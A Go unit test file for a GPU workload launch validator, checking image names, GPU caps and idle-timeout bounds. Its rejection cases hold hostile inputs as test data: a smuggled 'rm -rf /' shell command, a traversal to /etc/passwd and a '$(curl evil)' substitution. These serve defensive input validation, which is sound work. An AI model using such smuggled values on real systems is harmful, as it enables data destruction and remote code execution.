package workloads

import (
	"errors"
	"testing"
)

// M6 regression: launch input bounds. Each rejected case is an abuse vector — a
// negative idle timeout used to wrap to a near-infinite uint32 on the wire, an
// oversized gpu_count could squat the queue, and a malformed image string would
// travel verbatim into a docker invocation on the agent.
func TestValidateLaunch(t *testing.T) {
	ptr := func(n int) *int { return &n }

	valid := func() LaunchRequest {
		return LaunchRequest{Name: "train-job", Image: "ubuntu:22.04", GPUCount: 1}
	}

	t.Run("accepts well-formed requests", func(t *testing.T) {
		for _, img := range []string{
			"ubuntu:22.04",
			"nvidia/cuda:12.2.0-runtime-ubuntu22.04",
			"ghcr.io/acme/trainer:v1.2.3",
			"registry.example.com:5000/team/app:latest",
			"python@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
			"", // empty = caller resolves a default; not the validator's call
		} {
			req := valid()
			req.Image = img
			if err := validateLaunch(&req); err != nil {
				t.Errorf("image %q: unexpected error %v", img, err)
			}
		}
	})

	t.Run("rejects abusive values", func(t *testing.T) {
		long := make([]byte, 200)
		for i := range long {
			long[i] = 'a'
		}
		cases := []struct {
			name string
			mut  func(*LaunchRequest)
		}{
			{"empty name", func(r *LaunchRequest) { r.Name = "  " }},
			{"name too long", func(r *LaunchRequest) { r.Name = string(long) }},
			{"gpu_count over cap", func(r *LaunchRequest) { r.GPUCount = maxGPUsPerWorkload + 1 }},
			{"negative idle timeout", func(r *LaunchRequest) { r.IdleTimeoutSec = ptr(-1) }},
			{"sub-minimum idle timeout", func(r *LaunchRequest) { r.IdleTimeoutSec = ptr(5) }},
			{"idle timeout over 7 days", func(r *LaunchRequest) { r.IdleTimeoutSec = ptr(maxIdleTimeoutSec + 1) }},
			{"image with shell metachars", func(r *LaunchRequest) { r.Image = "ubuntu:22.04; rm -rf /" }},
			{"image with spaces", func(r *LaunchRequest) { r.Image = "ubuntu 22.04" }},
			{"image with traversal", func(r *LaunchRequest) { r.Image = "../../etc/passwd" }},
			{"image with env expansion", func(r *LaunchRequest) { r.Image = "$(curl evil)" }},
		}
		for _, tc := range cases {
			req := valid()
			tc.mut(&req)
			if err := validateLaunch(&req); !errors.Is(err, ErrInvalidRequest) {
				t.Errorf("%s: want ErrInvalidRequest, got %v", tc.name, err)
			}
		}
	})

	t.Run("normalizes instead of rejecting", func(t *testing.T) {
		req := valid()
		req.GPUCount = 0
		req.IdleTimeoutSec = ptr(0)
		if err := validateLaunch(&req); err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if req.GPUCount != 1 {
			t.Errorf("gpu_count 0 should default to 1, got %d", req.GPUCount)
		}
		if req.IdleTimeoutSec != nil {
			t.Errorf("idle_timeout_sec 0 must mean 'use default', not 'no timeout'; got %v", *req.IdleTimeoutSec)
		}
	})
}
